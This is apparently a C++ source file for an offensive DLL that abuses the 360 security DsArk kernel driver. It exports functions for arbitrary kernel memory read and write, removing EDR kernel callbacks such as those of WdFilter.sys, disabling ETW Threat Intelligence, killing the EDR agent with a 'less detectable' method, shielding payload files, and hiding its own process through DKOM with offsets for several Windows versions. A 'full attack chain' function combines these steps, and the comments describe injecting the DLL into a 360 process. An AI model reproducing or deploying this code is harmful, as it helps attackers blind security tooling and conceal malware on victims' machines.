/*
 * dsark64_attack_main.cpp — Attack DLL entry point + exported attack functions
 *
 * Build DLL:
 *   cl /EHsc /LD dsark64_attack_main.cpp dsark64_ioctl.cpp
 *      dsark64_crypto.cpp dsark64_attack.cpp
 *      /link bcrypt.lib /out:dsark64_attack.dll
 *      /DEF:dsark64_attack.def
 *
 * Inject dll này vào process có 360 SelfProtection token
 * (e.g., 360sd.exe, 360tray.exe) để vượt IRP_MJ_CREATE gate.
 *
 * Export functions có thể gọi qua LoadLibrary + GetProcAddress
 * hoặc qua shellcode.
 *
 * FULL ATTACK CHAIN:
 *   1. OpenDevice          — mở handle tới \Device\DsArk
 *   2. RemoveEDRCallbacks  — xóa PspCreate/Thread/Image callbacks của EDR
 *   3. DisableEtwTI        — vô hiệu ETW Threat Intelligence
 *   4. (Optional) KillEDR  — kill EDR usermode agent
 *   5. (Optional) ProtectFiles — tự bảo vệ payload files
 */

#include "dsark64.h"
#include <stdio.h>

// Declare attack functions from dsark64_attack.cpp
extern "C" BOOL DsArkRemoveCallbacks(HANDLE hDev, const WCHAR* targetDriverName);
extern "C" BOOL DsArkDisableEtwTI(HANDLE hDev);
extern "C" BOOL DsArkDKOM_HideProcess(HANDLE hDev, uint64_t kernBase,
                                       DWORD targetPid, DWORD apl_offset,
                                       DWORD pid_offset);

// Global device handle (opened once at DLL attach or explicit init)
static HANDLE g_hDev = NULL;

// ---------------------------------------------------------------------------
// DLL Main
// ---------------------------------------------------------------------------
BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID)
{
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hInst);
    return TRUE;
}

// ---------------------------------------------------------------------------
// Exported: initialize (open device)
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_Init(void)
{
    g_hDev = DsArkOpen();
    return g_hDev != NULL;
}

// ---------------------------------------------------------------------------
// Exported: cleanup
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
void DsArk_Cleanup(void)
{
    DsArkClose(g_hDev);
    g_hDev = NULL;
}

// ---------------------------------------------------------------------------
// Exported: get driver version (sanity check that IOCTLs work)
// Expected: 0x11000231
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
DWORD DsArk_Version(void)
{
    if (!g_hDev) return 0;
    return DsArkGetVersion(g_hDev);
}

// ---------------------------------------------------------------------------
// Exported: kernel read (wrapper)
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_KernRead(UINT64 addr, PVOID buf, DWORD size)
{
    if (!g_hDev) return FALSE;
    return DsArkKernReadEx(g_hDev, addr, buf, size);
}

// ---------------------------------------------------------------------------
// Exported: kernel write (wrapper)
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_KernWrite(UINT64 addr, PVOID data, DWORD size)
{
    if (!g_hDev) return FALSE;
    return DsArkKernWriteEx(g_hDev, addr, data, size);
}

// ---------------------------------------------------------------------------
// Exported: FULL EVASION — remove all callbacks of an EDR driver
//
// targetDriver: kernel driver filename (e.g., L"WdFilter.sys")
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_BlindEDR(const WCHAR* targetDriver)
{
    if (!g_hDev) return FALSE;

    BOOL ok1 = DsArkRemoveCallbacks(g_hDev, targetDriver);
    BOOL ok2 = DsArkDisableEtwTI(g_hDev);

    return ok1 || ok2;   // success if at least one operation worked
}

// ---------------------------------------------------------------------------
// Exported: kill process (encrypted variant — harder to detect)
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_EncKill(DWORD targetPid)
{
    if (!g_hDev) return FALSE;
    return DsArkEncKill(g_hDev, targetPid, FALSE);
}

// ---------------------------------------------------------------------------
// Exported: kill process (simple variant)
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_SimpleKill(DWORD targetPid)
{
    if (!g_hDev) return FALSE;
    return DsArkSimpleKill(g_hDev, targetPid);
}

// ---------------------------------------------------------------------------
// Exported: file protect (add path to driver's protection list)
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_ProtectFile(const WCHAR* filePath)
{
    if (!g_hDev) return FALSE;
    return DsArkFileProtect(g_hDev, FPROT_ADD_NORMAL, filePath);
}

// ---------------------------------------------------------------------------
// Exported: registry protect
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_ProtectReg(const WCHAR* regPath)
{
    if (!g_hDev) return FALSE;
    return DsArkRegProtect(g_hDev, RPROT_ADD_A, regPath);
}

// ---------------------------------------------------------------------------
// Exported: FULL ATTACK CHAIN
//
// Params:
//   targetEdrDriver  — kernel driver to blind (e.g., L"WdFilter.sys")
//   targetEdrPid     — usermode agent PID to kill (0 = skip)
//   payloadFilePath  — file to protect after evasion (NULL = skip)
//
// Sequence:
//   1. Remove EDR kernel callbacks  → EDR mù với process/thread/image events
//   2. Disable ETW Threat Intel     → Defender/Sentinel mất kernel telemetry
//   3. Kill EDR usermode agent      → EDR không restart callbacks (no kernel callback)
//   4. Protect payload file         → payload không bị xóa bởi on-demand scan
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_FullChain(const WCHAR* targetEdrDriver,
                     DWORD        targetEdrPid,
                     const WCHAR* payloadFilePath)
{
    if (!g_hDev) {
        g_hDev = DsArkOpen();
        if (!g_hDev) return FALSE;
    }

    BOOL result = TRUE;

    // Step 1: Sanity check — verify driver responds
    DWORD ver = DsArkGetVersion(g_hDev);
    if (ver != 0x11000231) {
        // Unexpected version or IOCTL not working
        return FALSE;
    }

    // Step 2: Remove EDR kernel callbacks
    if (targetEdrDriver && *targetEdrDriver) {
        BOOL ok = DsArkRemoveCallbacks(g_hDev, targetEdrDriver);
        result &= ok;
    }

    // Step 3: Disable ETW Threat Intelligence
    DsArkDisableEtwTI(g_hDev);   // best-effort, don't fail chain

    // Step 4: Kill EDR usermode agent (after kernel callbacks removed)
    if (targetEdrPid != 0) {
        // Try encrypted kill first (less detectable), fallback to simple
        BOOL killed = DsArkEncKill(g_hDev, targetEdrPid, FALSE);
        if (!killed)
            killed = DsArkSimpleKill(g_hDev, targetEdrPid);
        // Not fatal if kill fails (agent may still be running but blind)
    }

    // Step 5: Protect payload file
    if (payloadFilePath && *payloadFilePath) {
        DsArkFileProtect(g_hDev, FPROT_ADD_NORMAL, payloadFilePath);
    }

    return result;
}

// ---------------------------------------------------------------------------
// Exported: DKOM — hide own process from active process list
//
// Win10 2004+: apl_offset=0x448, pid_offset=0x440
// Win10 1607–1903: apl_offset=0x2E8, pid_offset=0x2E0
// Win11 22H2+: apl_offset=0x448, pid_offset=0x440
// ---------------------------------------------------------------------------
extern "C" __declspec(dllexport)
BOOL DsArk_HideSelf(UINT64 kernBase, DWORD aplOffset, DWORD pidOffset)
{
    if (!g_hDev || !kernBase) return FALSE;
    DWORD ownPid = GetCurrentProcessId();
    return DsArkDKOM_HideProcess(g_hDev, kernBase, ownPid, aplOffset, pidOffset);
}
